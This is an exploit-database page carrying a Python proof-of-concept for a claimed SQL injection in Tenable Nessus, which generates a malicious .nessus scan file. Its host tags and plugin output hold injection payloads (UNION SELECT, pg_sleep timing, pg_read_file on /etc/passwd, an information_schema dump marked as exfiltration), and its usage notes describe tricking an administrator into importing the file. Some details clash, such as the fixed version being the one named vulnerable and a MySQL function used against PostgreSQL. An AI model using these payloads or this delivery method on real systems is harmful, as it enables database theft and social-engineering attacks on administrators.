---
title: Tenable Nessus 10.12.1 SQL Injection
url: https://cxsecurity.com/issue/WLB-2026090005
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-09-06
fetch_date: 2026-09-07T06:48:03.629116
---

# Tenable Nessus 10.12.1 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Tenable Nessus 10.12.1 SQL Injection** **2026.09.06**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-57588](https://cxsecurity.com/cveshow/CVE-2026-57588/ "Click to see CVE-2026-57588")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Tenable Nessus 10.12.1 - SQL Injection
# CVE: CVE-2026-57588
# Date: 2026-06-26
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Author Blog : https://banyamersecurity.com/blog/
# Vendor Homepage: https://www.tenable.com
# Software Link: https://www.tenable.com/downloads/nessus
# Affected: Nessus 10.12.0 and prior
# Tested on: Nessus 10.12.0
# Category: Remote
# Platform: Linux / Windows
# Exploit Type: SQL Injection
# CVSS: 4.3 (Medium)
# Description: A SQL injection vulnerability exists in Tenable Nessus when importing malicious scan result files (.nessus XML).
# Successful exploitation allows data exfiltration from the backend database by a privileged user.
# Fixed in: Nessus 10.12.1 and later
# Usage:
# python3 exploit.py -o malicious.nessus
#
# Examples:
# python3 exploit.py
# python3 exploit.py --output poc.nessus
#
# Options:
# -o, --output Output filename for the malicious .nessus file
#
# Notes:
# • This is a Proof of Concept. Requires social engineering to trick a privileged user into importing the file.
# • Works best against PostgreSQL backend (default in Nessus).
#
# How to Use
#
# Step 1:
# Generate the malicious file using this script.
#
# Step 2:
# Deliver the .nessus file to a Nessus administrator and have them import it via the web interface.
def banner():
print(r"""
╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗
║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║
║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝
║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗
║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║
╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝
╔═╗ Banyamer Security ╔═╗
""")
import argparse
import xml.etree.ElementTree as ET
def create\_malicious\_nessus(output\_file):
root = ET.Element("NessusClientData\_v2")
report = ET.SubElement(root, "Report")
report.set("name", "PoC - CVE-2026-57588")
host = ET.SubElement(report, "ReportHost")
host.set("name", "poc-target.example.com")
host\_properties = ET.SubElement(host, "HostProperties")
tags = [
("hostname", "evil-host' UNION SELECT NULL, current\_database(), version(), user() -- "),
("os", "Linux' AND (SELECT pg\_sleep(5))=0 -- "),
("ip", "192.168.1.1' OR '1'='1"),
("fqdn", "test' ; SELECT pg\_read\_file('/etc/passwd') -- "),
]
for name, value in tags:
tag = ET.SubElement(host\_properties, "tag")
tag.set("name", name)
tag.text = value
item = ET.SubElement(host, "ReportItem")
ET.SubElement(item, "pluginID").text = "999999"
ET.SubElement(item, "pluginName").text = "CVE-2026-57588 PoC"
ET.SubElement(item, "port").text = "0"
ET.SubElement(item, "protocol").text = "tcp"
ET.SubElement(item, "severity").text = "0"
ET.SubElement(item, "description").text = "Proof of Concept for SQL Injection"
plugin\_output = ET.SubElement(item, "plugin\_output")
plugin\_output.text = """Normal output
' UNION ALL SELECT
'=== DATA EXFIL START ===',
table\_name,
column\_name,
'=== DATA EXFIL END ==='
FROM information\_schema.columns
WHERE table\_schema = current\_schema() -- """
tree = ET.ElementTree(root)
with open(output\_file, "wb") as f:
tree.write(f, encoding="utf-8", xml\_declaration=True)
print(f"[+] Malicious file successfully created: {output\_file}")
print("[+] Deliver this file to a privileged Nessus user for import.")
def main():
banner()
parser = argparse.ArgumentParser(description="CVE-2026-57588 Nessus SQLi PoC")
parser.add\_argument("-o", "--output", default="cve-2026-57588-poc.nessus", help="Output filename (default: cve-2026-57588-poc.nessus)")
args = parser.parse\_args()
create\_malicious\_nessus(args.output)
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026090005)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top